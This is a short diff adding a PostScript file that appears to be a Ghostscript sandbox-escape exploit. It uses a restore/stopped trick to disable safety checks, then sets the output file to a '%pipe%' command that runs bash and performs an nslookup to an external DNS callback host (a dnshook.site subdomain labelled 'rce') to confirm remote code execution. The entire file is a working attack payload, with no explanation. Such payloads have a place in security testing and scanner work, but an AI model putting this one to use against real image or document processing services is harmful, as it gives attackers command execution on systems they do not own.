@@ -1,0 +1,6 @@
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%bash -c 'nslookup rce.aa51f9cd-b8f5-432c-b405-f6279843a58e.dnshook.site') currentdevice putdeviceprops
